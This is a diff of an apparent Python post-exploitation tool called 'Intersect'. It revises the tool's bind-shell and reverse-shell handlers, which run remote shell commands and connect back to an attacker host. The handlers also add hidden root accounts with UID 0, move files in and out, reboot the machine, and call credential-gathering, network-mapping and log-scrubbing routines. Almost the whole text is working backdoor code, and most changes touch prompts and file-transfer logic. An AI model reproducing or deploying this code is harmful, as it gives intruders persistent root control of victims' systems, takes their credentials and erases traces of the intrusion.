@@ -672,7 +672,7 @@ def bindShell():
         print "[+] Shell bound on 443"
         conn, addr = server.accept()
         print "[+] New Connection: %s" % addr[0]
-        conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+        conn.send("\nIntersect "+str(os.getcwd())+" >> ")
     except:
         print "[!] Connection closed."
     	sys.exit(2)
@@ -690,39 +690,37 @@ def bindShell():
 	    destination = cmd[3:].replace('\n','')
             if os.path.isdir(destination):
 	        os.chdir(destination)
-	        conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+	        conn.send("\nIntersect "+str(os.getcwd())+" >> ")
             else:
 	        conn.send("[!] Directory does not exist") 
-	        conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+	        conn.send("\nIntersect "+str(os.getcwd())+" >> ")
         elif cmd.startswith('adduser'):
             strip = cmd.split(" ")
             acct = strip[1]
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
             conn.send("[+] Root account " + acct + " has been created.")   
         elif cmd.startswith('upload'):
-            data = conn.recv(1024)
-            strip = data.split(" ")
-            (filepath, filename) = os.path.split(strip)
-            data = conn.recv(1024)
-            filewrite=file(filename, "wb")
-            filewrite.write(data)
-            filewrite.close()
+            getname = cmd.split(" ")
+            rem_file = getname[1]
+            filename = rem_file.replace("/","_")
+            filedata = conn.recv(socksize)
+            newfile = file(filename, "wb")
+            newfile.write(filedata)
+            newfile.close()
             if os.path.isfile(filename):
                 conn.send("[+] File upload complete!")
             if not os.path.isfile(filename):
                 conn.send("[!] File upload failed! Please try again")
         elif cmd.startswith('download'):
-            data = conn.recv(1024)
-            strip = cmd.split(" ")
-            filename = strip[1]
-            if not os.path.isfile(filename):
-                conn.send("[!] File not found on host! Check the filename and try again.")
-            if os.path.isfile(filename):
-                fileopen=file(filename, "rb")
-                file_data=""
-                for data in fileopen:
-                    file_data += data
-                    conn.sendall(file_data)
+            getname = cmd.split(" ")
+            loc_file = getname[1]
+            if os.path.exists(loc_file) is True:
+                sendfile = open(loc_file, "r")
+                filedata = sendfile.read()
+                sendfile.close()
+                conn.sendall(filedata)
+            else:
+                conn.send("[+] File not found!")
         elif cmd.startswith("rebootsys"):
             conn.send("[!] Server system is going down for a reboot!")
             os.system("shutdown -h now")
@@ -730,38 +728,38 @@ def bindShell():
             Gather_OS()
             conn.send("\n[+] OS Info Gathering complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
-            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
         elif cmd == ("extask network\n"):
             NetworkInfo()
             conn.send("\n[+] Network Gather complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
-            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
         elif cmd == ("extask credentials\n"):
             GetCredentials()
             conn.send("\n[+] Credentials Gather complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
-            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
         elif cmd == ("extask livehosts\n"):
             NetworkMap()
             conn.send("\n[+] Network Map complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
-            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
         elif cmd == ("extask findextras\n"):
             FindExtras()
             conn.send("\n[+] Extras Gather complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
-            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
         elif cmd == ("extask scrub\n"):
             ScrubLog()
             conn.send("\n[+] Scrubbing complete.")
-            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
         elif cmd == ('killme\n'):
             conn.send("[!] Shutting down shell!\n")
             conn.close()
             sys.exit(0)
         elif proc:
             conn.sendall( stdout )
-            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
 
 
 def reverseShell():
@@ -772,13 +770,13 @@ def reverseShell():
     try:
         conn.connect((RHOST, RPORT))
         conn.send("[+] New connection established!")
-        conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+        conn.send("\nIntersect "+str(os.getcwd())+" >> ")
     except:
         print("[!] Connection error!")
         sys.exit(2)
 
     while True:
-	cmd = conn.recv(socksize)
+        cmd = conn.recv(socksize)
         proc = Popen(cmd,
              shell=True,
              stdout=subprocess.PIPE,
@@ -790,78 +788,76 @@ def reverseShell():
 	    destination = cmd[3:].replace('\n','')
             if os.path.isdir(destination):
 	        os.chdir(destination)
-	        conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+	        conn.send("\nIntersect "+str(os.getcwd())+" >> ")
             else:
 	        conn.send("[!] Directory does not exist") 
-	        conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+	        conn.send("\nIntersect "+str(os.getcwd())+" >> ")
         elif cmd.startswith('adduser'):
             strip = cmd.split(" ")
             acct = strip[1]
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
             conn.send("[+] Root account " + acct + " has been created.")   
         elif cmd.startswith('upload'):
-            data = conn.recv(1024)
-            strip = data.split(" ")
-            filename = strip[1]
-            data = conn.recv(1024)
-            filewrite=file(filename, "wb")
-            filewrite.write(data)
-            filewrite.close()
+            getname = cmd.split(" ")
+            rem_file = getname[1]
+            filename = rem_file.replace("/","_")
+            filedata = conn.recv(socksize)
+            newfile = file(filename, "wb")
+            newfile.write(filedata)
+            newfile.close()
             if os.path.isfile(filename):
                 conn.send("[+] File upload complete!")
             if not os.path.isfile(filename):
                 conn.send("[!] File upload failed! Please try again")
         elif cmd.startswith('download'):
-            data = conn.recv(1024)
-            strip = cmd.split(" ")
-            filename = strip[1]
-            if not os.path.isfile(filename):
-                conn.send("[!] File not found on host! Check the filename and try again.")
-            if os.path.isfile(filename):
-                fileopen=file(filename, "rb")
-                file_data=""
-                for data in fileopen:
-                    file_data += data
-                    conn.sendall(file_data)
+            getname = cmd.split(" ")
+            loc_file = getname[1]
+            if os.path.exists(loc_file) is True:
+                sendfile = open(loc_file, "r")
+                filedata = sendfile.read()
+                sendfile.close()
+                conn.sendall(filedata)
+            else:
+                conn.send("[+] File not found!")
         elif cmd.startswith("rebootsys"):
             conn.send("[!] Server system is going down for a reboot!")
             os.system("shutdown -h now")
-        elif cmd == ("extask osinfo"):
+        elif cmd == ("extask osinfo\n"):
             Gather_OS()
             conn.send("\n[+] OS Info Gathering complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
-            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
-        elif cmd == ("extask network"):
+            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
+        elif cmd == ("extask network\n"):
             NetworkInfo()
             conn.send("\n[+] Network Gather complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
-            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
-        elif cmd == ("extask credentials"):
+            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
+        elif cmd == ("extask credentials\n"):
             GetCredentials()
             conn.send("\n[+] Credentials Gather complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
-            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
-        elif cmd == ("extask livehosts"):
+            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
+        elif cmd == ("extask livehosts\n"):
             NetworkMap()
             conn.send("\n[+] Network Map complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
-            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
-        elif cmd == ("extask findextras"):
+            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
+        elif cmd == ("extask findextras\n"):
             FindExtras()
             conn.send("\n[+] Extras Gather complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
-            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
-        elif cmd == ("extask scrub"):
+            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
+        elif cmd == ("extask scrub\n"):
             ScrubLog()
             conn.send("\n[+] Scrubbing complete.")
-            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
-        elif cmd == ('killme'):
+            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
+        elif cmd == ('killme\n'):
             conn.send("[!] Shutting down shell!\n")
             conn.close()
             sys.exit(0)
         elif proc:
             conn.sendall( stdout )
-            conn.send("\nIntersect: "+str(os.getcwd())+" $ ") 
+            conn.send("\nIntersect "+str(os.getcwd())+" >> ")
 
 
 def MakeArchive():
